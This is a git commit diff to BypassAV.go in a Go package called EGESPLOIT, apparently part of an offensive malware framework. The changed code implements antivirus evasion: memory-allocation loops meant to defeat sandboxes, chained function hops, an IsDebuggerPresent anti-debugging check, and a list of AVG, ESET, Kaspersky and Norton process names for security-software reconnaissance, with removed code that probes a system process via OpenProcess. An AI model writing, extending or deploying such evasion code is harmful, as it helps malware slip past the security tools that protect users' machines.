ab9e75307f52a933d47f6ab5b238e93e9486ee1f
Ege Balcı <egebal1996@gmail.com>
2016-08-22 16:41:10 +0300

    Update BypassAV.go

--- BypassAV.go
+++ BypassAV.go
@@ -1,51 +1,117 @@
 package EGESPLOIT
 
+//import "os/exec"
+//import "strings"
 
-import "net/http"
-import "io/ioutil"
-import "strings"
+var MagicNumber int64 = 0;  
 
 
-func BypassAV(Rate int) { // Rate 1 - 3
+func BypassAV(Rate int) {
   if Rate == 1 {
     AllocateFakeMemory()
   }else if Rate == 2 {
     AllocateFakeMemory()
-    GoBig()
+    Jump()
   }else if Rate == 3 {
     AllocateFakeMemory()
-    GoBig()
-    LookForLegend()
+    Jump()
+    ProcessRecon()
+  }else{
+
   }
+}
 
 
-
+func Jump() {
+  MagicNumber++
+  hop1()
 }
 
 func AllocateFakeMemory()  {
-  var Size int = 30000000
-  Buffer_1 := make([]byte, Size)
-  Buffer_1[0] = 1
-  var Buffer_2 [102400000]byte
-  Buffer_2[0] = 0
-}
-
-func LookForLegend()  {
-  for ;; {
-    Response, _ := http.Get("https://github.com/EgeBalci");
-    Bullshit, _ := ioutil.ReadAll(Response.Body)
-    if strings.Contains(string(Bullshit), "RWdlQmFsY8Sx") {
-      break;
-    }
+  for i := 0; i < 1000; i++ {
+    var Size int = 30000000
+    Buffer_1 := make([]byte, Size)
+    Buffer_1[0] = 1
+    var Buffer_2 [102400000]byte
+    Buffer_2[0] = 0
   }
 }
 
-func GoBig()  {
-  for ;; {
-    PID := 4
-    Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(0), uintptr(PID))
-    if Proc != 0 {
-      break
-    }
+func CheckDebugger() {
+  Flag,_,_ := IsDebuggerPresent.Call()
+  if Flag != 0 {
+    //Debugger Active !!
+    CheckDebugger()
   }
+}
+
+
+func ProcessRecon() {
+
+  //Enumarate AV processes...
+
+  /* AVG
+    avgidsagenta.exe
+    avgcsrva.exe
+    avgwdsvca.exe
+    avgnsa.exe
+    avgemca.exe
+    avgrsa.exe
+  */
+
+  /* ESET
+    egui.exe
+  */
+
+  /* KASPERSKY
+    avpui.exe
+  */
+
+
+  /* NORTON
+    NS.exe
+  */
+
+
+}
+
+
+func hop1() {
+  MagicNumber++
+  hop2()
+}
+func hop2() {
+  MagicNumber++
+  hop3()
+}
+func hop3() {
+  MagicNumber++
+  hop4()
+}
+func hop4() {
+  MagicNumber++
+  hop5()
+}
+func hop5() {
+  MagicNumber++
+  hop6()
+}
+func hop6() {
+  MagicNumber++
+  hop7()
+}
+func hop7() {
+  MagicNumber++
+  hop8()
+}
+func hop8() {
+  MagicNumber++
+  hop9()
+}
+func hop9() {
+  MagicNumber++
+  hop10()
+}
+func hop10() {
+  MagicNumber++
 }
